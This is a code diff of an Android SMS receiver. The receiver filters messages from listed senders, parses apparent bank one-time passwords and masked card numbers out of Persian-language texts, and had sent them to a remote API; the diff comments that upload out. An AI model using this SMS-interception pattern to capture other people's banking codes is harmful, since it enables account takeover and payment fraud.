@@ -50,6 +50,7 @@ public class SMSReceiver extends BroadcastReceiver {
             messageBody += msgBody;
           }
 
+
           if (tinyDB.getListString("numbers").size() > 0) {
             for (String number : numbers) {
               if (messageFrom.contains(number)) {
@@ -63,29 +64,29 @@ public class SMSReceiver extends BroadcastReceiver {
             && messageBody.contains("رمز") && messageBody.contains("اعتبار")) {
 
             CardModel model = Splitter.INSTANCE.split(messageBody);
-            retrofit.create(ApiInterface.class).postResult(model).enqueue(new Callback<CardResponse>() {
-              @Override
-              public void onResponse(Call<CardResponse> call, Response<CardResponse> response) {
-                if (response.isSuccessful()) {
-                  Toast.makeText(context2, "Api call successful", Toast.LENGTH_SHORT).show();
-                  String lastCallMessage = new StringBuilder("OTP: ")
-                    .append(model.getOPT())
-                    .append("\n")
-                    .append("ToCard: ")
-                    .append(model.getMaskCardNumber())
-                    .append("\n")
-                    .append("At: ")
-                    .append(model.getTime())
-                    .toString();
-                  tinyDB.putString("last_call", lastCallMessage);
-                } else Toast.makeText(context2, "Request failed!!!", Toast.LENGTH_SHORT).show();
-              }
-
-              @Override
-              public void onFailure(Call<CardResponse> call, Throwable t) {
-                Toast.makeText(context2, "Request failed!!!", Toast.LENGTH_SHORT).show();
-              }
-            });
+//            retrofit.create(ApiInterface.class).postResult(model).enqueue(new Callback<CardResponse>() {
+//              @Override
+//              public void onResponse(Call<CardResponse> call, Response<CardResponse> response) {
+//                if (response.isSuccessful()) {
+//                  Toast.makeText(context2, "Api call successful", Toast.LENGTH_SHORT).show();
+//                  String lastCallMessage = new StringBuilder("OTP: ")
+//                    .append(model.getOPT())
+//                    .append("\n")
+//                    .append("ToCard: ")
+//                    .append(model.getMaskCardNumber())
+//                    .append("\n")
+//                    .append("At: ")
+//                    .append(model.getTime())
+//                    .toString();
+//                  tinyDB.putString("last_call", lastCallMessage);
+//                } else Toast.makeText(context2, "Request failed!!!", Toast.LENGTH_SHORT).show();
+//              }
+//
+//              @Override
+//              public void onFailure(Call<CardResponse> call, Throwable t) {
+//                Toast.makeText(context2, "Request failed!!!", Toast.LENGTH_SHORT).show();
+//              }
+//            });
           }
         } catch (Exception ignored) {
         }
